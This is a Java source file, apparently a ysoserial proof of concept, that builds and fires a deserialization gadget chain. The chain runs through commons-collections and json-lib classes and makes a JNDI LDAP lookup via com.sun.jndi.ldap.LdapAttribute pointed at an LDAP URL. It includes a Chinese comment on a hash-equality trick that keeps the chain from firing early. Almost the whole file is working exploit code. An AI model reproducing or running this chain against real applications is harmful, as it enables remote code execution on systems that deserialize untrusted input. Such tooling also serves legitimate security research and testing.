package ysoserial.payloads;

import net.sf.json.JSONArray;
import org.apache.commons.collections.comparators.NullComparator;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.set.ListOrderedSet;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationTargetException;
import java.util.concurrent.ConcurrentSkipListSet;
/*
gadget chains
ConcurrentSkipListSet equals
containsAll(c) && c.containsAll(this);
net.sf.json.JSONArray.fromObject(Object, JsonConfig)
net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig
* */
public class LdapPoc {
    public static void main(String[] args) throws InstantiationException, IllegalAccessException,
        IllegalArgumentException, InvocationTargetException, Exception {

        Object o = Reflections.getFirstCtor("com.sun.jndi.ldap.LdapAttribute").newInstance("iswin");
        Reflections.setFieldValue(o, "baseCtxURL", "ldap://127.0.0.1:38900");
        ConcurrentSkipListSet sets = new ConcurrentSkipListSet(new NullComparator());
        sets.add(o);
        ListOrderedSet set = new ListOrderedSet();
        JSONArray array = new JSONArray();
        array.add("\u0915\u0009\u001e\u000c\u0002\u0915\u0009\u001e\u000b\u0004");
        Reflections.setSuperFieldValue(set, "collection", array);
        Flat3Map map = new Flat3Map();
        map.put(set, true);
        map.put(sets, true);

        //如果不在这里更改值，则满足不了hash相等条件，如果在之前设置为空，那么在Flat3Map的put方法时就会触发漏洞，则不能完成生成payload。
        Reflections.setSuperFieldValue1(o,  "attrID", "");
        byte[] bt = Serializer.serialize(map);
        Deserializer.deserialize(bt);
    }
}
